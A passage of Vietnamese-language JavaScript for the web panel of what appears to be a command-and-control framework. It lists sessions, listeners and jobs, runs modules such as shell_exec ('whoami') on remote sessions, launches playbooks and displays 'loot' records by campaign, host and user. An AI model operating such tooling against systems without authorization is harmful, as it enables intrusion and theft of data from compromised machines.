    if (navigator.clipboard) navigator.clipboard.writeText('listen ssl').then(function() { alert('Đã sao chép: listen ssl'); });
  });
  function loadJobs() {
    document.getElementById('jobs-list').innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(api('api/jobs')).then(function(d) {
      var el = document.getElementById('jobs-list');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      var jobs = d.jobs || [];
      if (!jobs.length) { el.innerHTML = '<p class="muted">Chưa có job. Tạo job: bấm &quot;Mở Chạy module&quot; ở trên → tick Chạy nền → Chạy.</p>'; return; }
      var rows = jobs.map(function(j) {
        return '<tr><td>' + (j.id !== undefined ? j.id : '') + '</td><td>' + (j.name || '') + '</td><td>' + (j.clients || []).join(', ') + '</td><td>' + (j.status || '') + '</td><td><button class="btn btn-danger btn-sm" data-job-kill="' + (j.id !== undefined ? j.id : '') + '">Dừng</button></td></tr>';
      });
      el.innerHTML = '<table><tr><th>Mã</th><th>Tên</th><th>Máy trạm</th><th>Trạng thái</th><th>Thao tác</th></tr>' + rows.join('') + '</table>';
      el.querySelectorAll('[data-job-kill]').forEach(function(btn) {
        btn.addEventListener('click', function() {
          var id = this.getAttribute('data-job-kill');
          fetch(api('api/jobs/kill'), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ job_id: parseInt(id, 10) }) }).then(function(r) { return r.json(); }).then(function(res) { if (res.ok) loadJobs(); else alert(res.error || 'Lỗi'); });
        });
      });
    }).catch(function() { document.getElementById('jobs-list').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  var jobsRefreshBtn = document.getElementById('jobs-refresh');
  if (jobsRefreshBtn) jobsRefreshBtn.addEventListener('click', loadJobs);
  function loadModules() {
    document.getElementById('modules-list').innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(api('api/modules')).then(function(d) {
      var el = document.getElementById('modules-list');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      window._modulesData = d.modules || [];
      var catSel = document.getElementById('module-category-filter');
      if (catSel && _modulesData.length) {
        var cats = [];
        _modulesData.forEach(function(m) { if (m.category && cats.indexOf(m.category) < 0) cats.push(m.category); });
        cats.sort();
        catSel.innerHTML = '<option value="">Tất cả</option>' + cats.map(function(c) { return '<option value="' + c + '">' + c + '</option>'; }).join('');
      }
      renderModulesFiltered();
    }).catch(function() { document.getElementById('modules-list').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  function renderModulesFiltered() {
    var mods = window._modulesData || [];
    var q = (document.getElementById('module-search') || {}).value || '';
    var cat = (document.getElementById('module-category-filter') || {}).value || '';
    var low = q.toLowerCase();
    var filtered = mods.filter(function(m) {
      if (cat && m.category !== cat) return false;
      if (low && !(m.name && m.name.toLowerCase().indexOf(low) >= 0) && !(m.doc && m.doc.toLowerCase().indexOf(low) >= 0)) return false;
      return true;
    });
    var el = document.getElementById('modules-list');
    if (!el) return;
    el.innerHTML = filtered.length ? filtered.map(function(m) {
      return '<div class="mod"><span class="mod-name">' + (m.name || '') + '</span> <span class="muted">' + (m.category || '') + '</span> <button class="btn btn-sm module-run-btn" data-run-module="' + (m.name || '') + '">Chạy</button><div class="mod-doc">' + (m.doc || '') + '</div></div>';
    }).join('') : '<p class="muted">Không có module trùng bộ lọc.</p>';
    el.querySelectorAll('[data-run-module]').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var name = this.getAttribute('data-run-module');
        document.getElementById('run-module').value = name;
        showPage('run');
      });
    });
  }
  var moduleSearchEl = document.getElementById('module-search');
  if (moduleSearchEl) moduleSearchEl.addEventListener('input', function() { if (window._modulesData) renderModulesFiltered(); });
  var moduleCatEl = document.getElementById('module-category-filter');
  if (moduleCatEl) moduleCatEl.addEventListener('change', function() { if (window._modulesData) renderModulesFiltered(); });
  var modulesRefreshBtn = document.getElementById('modules-refresh');
  if (modulesRefreshBtn) modulesRefreshBtn.addEventListener('click', loadModules);
  var _configCache = {};
  function loadConfig() {
    document.getElementById('config-list').innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(api('api/config/list')).then(function(d) {
      var el = document.getElementById('config-list');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      _configCache = d.config || {};
      renderConfigList(el, _configCache);
    }).catch(function() { document.getElementById('config-list').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  function renderConfigList(el, cfg) {
    var q = (document.getElementById('config-search') || {}).value.toLowerCase().trim();
    var sections = Object.keys(cfg).sort().filter(function(section) {
      if (!q) return true;
      if (section.toLowerCase().indexOf(q) >= 0) return true;
      return Object.keys(cfg[section]).some(function(k) { return (k + (cfg[section][k] || '')).toLowerCase().indexOf(q) >= 0; });
    });
    var html = '';
    sections.forEach(function(section) {
      var items = cfg[section];
      var lines = Object.keys(items).map(function(k) { return k + ' = ' + (items[k] || ''); }).join('\n');
      var esc = section.replace(/\\/g, '\\\\').replace(/"/g, '&quot;').replace(/</g, '&lt;');
      html += '<div class="config-section"><h3>[' + section + ']</h3> <button class="btn copy-btn" data-copy-section="' + esc + '">Sao chép section</button><pre>' + (lines || '') + '</pre></div>';
    });
    el.innerHTML = html || '<p class="muted">Không có section trùng bộ lọc.</p>';
    el.querySelectorAll('[data-copy-section]').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var sec = this.getAttribute('data-copy-section');
        if (!sec) return;
        var txt = '[' + sec + ']\n' + Object.keys(_configCache[sec] || {}).map(function(k) { return k + ' = ' + (_configCache[sec][k] || ''); }).join('\n');
        navigator.clipboard && navigator.clipboard.writeText(txt).then(function() { alert('Đã sao chép section [' + sec + ']'); });
      });
    });
  }
  var configSearchEl = document.getElementById('config-search');
  if (configSearchEl) configSearchEl.addEventListener('input', function() { if (Object.keys(_configCache).length) renderConfigList(document.getElementById('config-list'), _configCache); });
  var configRefreshBtn = document.getElementById('config-refresh');
  if (configRefreshBtn) configRefreshBtn.addEventListener('click', loadConfig);
  var configCopyAll = document.getElementById('config-copy-all');
  if (configCopyAll) configCopyAll.addEventListener('click', function() {
    if (Object.keys(_configCache).length === 0) { alert('Chưa tải cấu hình. Bấm Làm mới trước.'); return; }
    var lines = [];
    Object.keys(_configCache).sort().forEach(function(section) {
      lines.push('[' + section + ']');
      var items = _configCache[section];
      Object.keys(items).forEach(function(k) { lines.push(k + ' = ' + (items[k] || '')); });
      lines.push('');
    });
    var txt = lines.join('\n');
    if (navigator.clipboard) navigator.clipboard.writeText(txt).then(function() { alert('Đã sao chép toàn bộ cấu hình'); });
  });
  var _helpCommands = [], _helpModules = [];
  function loadHelp() {
    var cmdEl = document.getElementById('commands-list');
    var modEl = document.getElementById('help-modules-list');
    cmdEl.innerHTML = '<span class="spinner"></span> Đang tải...';
    modEl.innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(api('api/commands')).then(function(d) {
      if (d.error) { cmdEl.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      _helpCommands = d.commands || [];
      renderHelpCommands(cmdEl);
    }).catch(function() { cmdEl.innerHTML = '<p class="error">Không kết nối được.</p>'; });
    fetchJson(api('api/modules')).then(function(d) {
      if (d.error) { modEl.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      _helpModules = d.modules || [];
      renderHelpModules(modEl);
    }).catch(function() { modEl.innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  function renderHelpCommands(el) {
    var q = (document.getElementById('help-search') || {}).value.toLowerCase().trim();
    var list = q ? _helpCommands.filter(function(c) { return (c.name && c.name.toLowerCase().indexOf(q) >= 0) || (c.description && c.description.toLowerCase().indexOf(q) >= 0); }) : _helpCommands;
    el.innerHTML = list.length ? '<ul class="cmd-list">' + list.map(function(c) {
      var name = (c.name || '');
      return '<li><span class="name">' + name + '</span> <span class="muted">' + (c.description || '') + '</span> <button type="button" class="btn copy-btn btn-sm" data-copy-cmd="' + name.replace(/"/g, '&quot;') + '">Sao chép</button></li>';
    }).join('') + '</ul>' : '<p class="muted">Không có lệnh trùng bộ lọc.</p>';
    el.querySelectorAll('[data-copy-cmd]').forEach(function(btn) {
      btn.addEventListener('click', function() {
        var cmd = this.getAttribute('data-copy-cmd');
        if (cmd && navigator.clipboard) navigator.clipboard.writeText(cmd).then(function() { alert('Đã sao chép: ' + cmd); });
      });
    });
  }
  function renderHelpModules(el) {
    var q = (document.getElementById('help-search') || {}).value.toLowerCase().trim();
    var list = q ? _helpModules.filter(function(m) { return (m.name && m.name.toLowerCase().indexOf(q) >= 0) || (m.doc && m.doc.toLowerCase().indexOf(q) >= 0); }) : _helpModules;
    el.innerHTML = list.length ? '<ul class="cmd-list">' + list.map(function(m) { return '<li><span class="name">' + (m.name || '') + '</span> <span class="muted">' + (m.category || '') + ' — ' + (m.doc || '').substring(0, 100) + '</span></li>'; }).join('') + '</ul>' : '<p class="muted">Không có module trùng bộ lọc.</p>';
  }
  var helpSearchEl = document.getElementById('help-search');
  if (helpSearchEl) helpSearchEl.addEventListener('input', function() { renderHelpCommands(document.getElementById('commands-list')); renderHelpModules(document.getElementById('help-modules-list')); });
  function loadPlaybooks() {
    var sel = document.getElementById('playbook-select');
    var modsEl = document.getElementById('playbook-modules');
    if (!sel || !modsEl) return;
    sel.innerHTML = '<option value="">Đang tải...</option>';
    modsEl.textContent = '';
    fetchJson(api('api/playbooks')).then(function(d) {
      if (d.error) {
        sel.innerHTML = '<option value="">Lỗi: ' + d.error + '</option>';
        return;
      }
      var pbs = d.playbooks || [];
      if (!pbs.length) {
        sel.innerHTML = '<option value="">Chưa định nghĩa playbook</option>';
        return;
      }
      sel.innerHTML = pbs.map(function(pb, idx) {
        return '<option value="' + pb.name + '"' + (idx === 0 ? ' selected' : '') + '>' + pb.name + '</option>';
      }).join('');
      function updateModules() {
        var cur = sel.value;
        var found = pbs.filter(function(pb) { return pb.name === cur; })[0];
        if (found) {
          modsEl.textContent = 'Modules: ' + (found.modules || []).join(', ');
        } else {
          modsEl.textContent = '';
        }
      }
      sel.addEventListener('change', updateModules);
      updateModules();
    }).catch(function() {
      sel.innerHTML = '<option value="">Không kết nối được</option>';
    });

    // Đồng bộ phiên đã chọn
    var sid = getSelectedSession();
    var targetCard = document.getElementById('playbook-target-card');
    var targetId = document.getElementById('playbook-target-id');
    if (targetCard && targetId) {
      if (sid) {
        targetCard.style.display = 'block';
        targetId.textContent = sid;
      } else {
        targetCard.style.display = 'none';
        targetId.textContent = '';
      }
    }
  }

  var playbookClearTarget = document.getElementById('playbook-clear-target');
  if (playbookClearTarget) playbookClearTarget.addEventListener('click', function() { clearSelectedSession(); loadPlaybooks(); });

  var playbookRunBtn = document.getElementById('playbook-run-btn');
  if (playbookRunBtn) playbookRunBtn.addEventListener('click', function() {
    var sel = document.getElementById('playbook-select');
    var pb = sel ? sel.value.trim() : '';
    if (!pb) { alert('Chọn playbook trước.'); return; }
    var filter = (document.getElementById('playbook-filter') || {}).value.trim();
    var argsStr = (document.getElementById('playbook-args') || {}).value.trim();
    var background = !!(document.getElementById('playbook-background') || { checked: false }).checked;
    var sid = getSelectedSession();
    if (!filter && sid) {
      // Nếu chưa nhập filter, ưu tiên chạy trên session đã chọn
      filter = sid;
    }
    var out = document.getElementById('playbook-output');
    if (out) out.textContent = 'Đang chạy playbook...';
    playbookRunBtn.disabled = true;
    var body = {
      playbook: pb,
      filter: filter || null,
      background: background,
      arguments: argsStr ? argsStr.split(/\s+/).filter(Boolean) : []
    };
    fetch(api('api/playbook/run'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    }).then(function(r) { return r.json(); }).then(function(d) {
      if (out) out.textContent = (d.display || '') + (d.error ? '\nLỗi: ' + d.error : '');
      playbookRunBtn.disabled = false;
    }).catch(function(e) {
      if (out) out.textContent = 'Lỗi: ' + e;
      playbookRunBtn.disabled = false;
    });
  });

  function renderLoot(records) {
    var el = document.getElementById('loot-results');
    if (!el) return;
    if (!records || !records.length) {
      el.innerHTML = '<p class="muted">Không có bản ghi loot trùng bộ lọc.</p>';
      return;
    }
    var rows = records.map(function(r) {
      var meta = [
        '<strong>' + (r.host || '') + '</strong>',
        r.user || '',
        r.platform || '',
        r.campaign || ''
      ].filter(Boolean).join(' · ');
      var dataStr;
      try {
        dataStr = JSON.stringify(r.data, null, 2);
      } catch (e) {
        dataStr = String(r.data || '');
      }
      return '<tr>' +
        '<td>' + (r.ts_str || '') + '</td>' +
        '<td>' + (r.campaign || '') + '</td>' +
        '<td>' + (r.host || '') + '</td>' +
        '<td>' + (r.user || '') + '</td>' +
        '<td>' + (r.platform || '') + '</td>' +
        '<td><pre style="max-height:160px">' + dataStr + '</pre></td>' +
      '</tr>';
    }).join('');
    el.innerHTML = '<table><tr><th>Thời gian</th><th>Campaign</th><th>Host</th><th>User</th><th>Nền tảng</th><th>Dữ liệu</th></tr>' + rows + '</table>';
  }

  function loadLootKinds(callback) {
    fetchJson(api('api/loot/kinds')).then(function(d) {
      var sel = document.getElementById('loot-kind');
      if (!sel) return;
      if (d.error) {
        sel.innerHTML = '<option value="">Lỗi: ' + d.error + '</option>';
        return;
      }
      var kinds = d.kinds || [];
      if (!kinds.length) {
        sel.innerHTML = '<option value="">Chưa có loot</option>';
      } else {
        sel.innerHTML = kinds.map(function(k, idx) {
          return '<option value="' + k + '"' + (idx === 0 ? ' selected' : '') + '>' + k + '</option>';
        }).join('');
      }
      if (typeof callback === 'function') callback();
    }).catch(function() {
      var sel = document.getElementById('loot-kind');
      if (sel) sel.innerHTML = '<option value="">Không kết nối được</option>';
    });
  }

  function loadLoot() {
    var kindSel = document.getElementById('loot-kind');
    if (!kindSel || !kindSel.options.length) {
      loadLootKinds(loadLoot);
      return;
    }
    var kind = kindSel.value || '';
    if (!kind) {
      document.getElementById('loot-results').innerHTML = '<p class="muted">Chọn loại loot trước.</p>';
      return;
    }
    var campaign = (document.getElementById('loot-campaign') || {}).value.trim();
    var filter = (document.getElementById('loot-filter') || {}).value.trim();
    var limit = parseInt((document.getElementById('loot-limit') || {}).value || '50', 10);
    if (!limit || limit < 1) limit = 50;
    var url = api('api/loot?kind=' + encodeURIComponent(kind) +
      '&campaign=' + encodeURIComponent(campaign || '') +
      '&filter=' + encodeURIComponent(filter || '') +
      '&limit=' + encodeURIComponent(String(limit)));
    document.getElementById('loot-results').innerHTML = '<span class="spinner"></span> Đang tải...';
    fetchJson(url).then(function(d) {
      if (d.error) {
        document.getElementById('loot-results').innerHTML = '<p class="error">' + d.error + '</p>';
        return;
      }
      renderLoot(d.records || []);
    }).catch(function() {
      document.getElementById('loot-results').innerHTML = '<p class="error">Không kết nối được.</p>';
    });
  }

  var lootRefreshBtn = document.getElementById('loot-refresh');
  if (lootRefreshBtn) lootRefreshBtn.addEventListener('click', loadLoot);
  function loadRunPage() {
    var sid = getSelectedSession();
    var runId = document.getElementById('run-session-id');
    if (runId && sid) { runId.value = sid; }
    var runCard = document.getElementById('run-target-card');
    var runTargetId = document.getElementById('run-target-id');
    if (runCard && runTargetId) { if (sid) { runCard.style.display = 'block'; runTargetId.textContent = sid; } else { runCard.style.display = 'none'; } }
    fetchJson(api('api/modules')).then(function(d) {
      if (d.modules && d.modules.length) {
        window._runModulesData = d.modules;
        var dl = document.getElementById('run-module-list');
        dl.innerHTML = d.modules.map(function(m) { return '<option value="' + (m.name || '') + '">'; }).join('');
      }
    }).catch(function() {});
  }
  function resolveModuleName(shortName) {
    var mods = window._runModulesData || window._modulesData || [];
    for (var i = 0; i < mods.length; i++) {
      var n = mods[i].name || '';
      if (n === shortName || n.split('.').pop() === shortName) return n;
    }
    return shortName;
  }
  function setQuickRun(moduleShort, argsDefault) {
    var full = resolveModuleName(moduleShort);
    var runMod = document.getElementById('run-module');
    var runArgs = document.getElementById('run-args');
    if (runMod) runMod.value = full;
    if (runArgs) runArgs.value = argsDefault || '';
    var mods = window._runModulesData || window._modulesData || [];
    var m = mods.filter(function(x) { var n = x.name || ''; return n === full || n.split('.').pop() === moduleShort; })[0];
    var descEl = document.getElementById('run-module-desc');
    if (descEl) descEl.textContent = m && m.doc ? m.doc : '';
  }
  ['get_info', 'shell_exec', 'ps', 'ls'].forEach(function(shortName) {
    var btn = document.getElementById('quick-run-' + shortName);
    if (!btn) return;
    btn.addEventListener('click', function() {
      var args = (shortName === 'shell_exec') ? 'whoami' : (shortName === 'ls') ? '.' : '';
      setQuickRun(shortName, args);
    });
  });
  var runClearTarget = document.getElementById('run-clear-target');
  if (runClearTarget) runClearTarget.addEventListener('click', function() { clearSelectedSession(); });
  var runModuleInput = document.getElementById('run-module');
  if (runModuleInput) runModuleInput.addEventListener('input', function() {
    var name = this.value.trim();
    var descEl = document.getElementById('run-module-desc');
    if (!descEl) return;
    if (!name) { descEl.textContent = ''; return; }
    var mods = window._runModulesData || window._modulesData || [];
    var m = mods.filter(function(x) { return x.name === name; })[0];
    descEl.textContent = m && m.doc ? m.doc : '';
  });
  var runCopyBtn = document.getElementById('run-copy-output');
  if (runCopyBtn) runCopyBtn.addEventListener('click', function() {
    var pre = document.getElementById('run-output');
    if (pre && pre.textContent && navigator.clipboard) navigator.clipboard.writeText(pre.textContent).then(function() { alert('Đã sao chép kết quả'); });
  });
  function loadAbout() {
    fetchJson(api('api/serverinfo')).then(function(d) {
      var el = document.getElementById('serverinfo');
      if (d.error) { el.innerHTML = '<p class="error">' + d.error + '</p>'; return; }
      el.innerHTML = '<div class="card"><p><strong>Phiên bản:</strong> ' + (d.version || '') + '</p><p><strong>Python:</strong> ' + (d.python_version || '') + '</p><p><strong>Phiên:</strong> ' + (d.sessions !== undefined ? d.sessions : 0) + ' &nbsp; <strong>Listener:</strong> ' + (d.listeners !== undefined ? d.listeners : 0) + ' &nbsp; <strong>Job:</strong> ' + (d.jobs !== undefined ? d.jobs : 0) + '</p></div>';
    }).catch(function() { document.getElementById('serverinfo').innerHTML = '<p class="error">Không kết nối được.</p>'; });
  }
  document.querySelectorAll('.nav-link').forEach(function(a) {
    a.addEventListener('click', function(e) { e.preventDefault(); var p = a.getAttribute('data-page'); if (p) showPage(p); });
  });
  var runBtn = document.getElementById('run-btn');
  if (runBtn) runBtn.addEventListener('click', function() {
    var sessionId = document.getElementById('run-session-id').value.trim() || getSelectedSession() || null;
    var module = document.getElementById('run-module').value.trim();
    var args = document.getElementById('run-args').value.trim().split(/\s+/).filter(Boolean);
    var background = document.getElementById('run-background').checked;
    var out = document.getElementById('run-output');
    out.textContent = 'Đang chạy...';
    this.disabled = true;
    var body = { session_id: sessionId ? parseInt(sessionId, 10) : null, module: module, args: args, background: background };
    fetch(api('api/run'), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
      .then(function(r) { return r.json(); })
      .then(function(d) {
        out.textContent = (d.display || '') + (d.output || '') + (d.error ? '\nLỗi: ' + d.error : '');
        if (runBtn) runBtn.disabled = false;
      })
      .catch(function(e) {
        out.textContent = 'Lỗi: ' + e;
        if (runBtn) runBtn.disabled = false;
      });
  });
  updateSelectedSessionBar();
  showPage('dashboard');
})();
  </script>
</body>
</html>'''
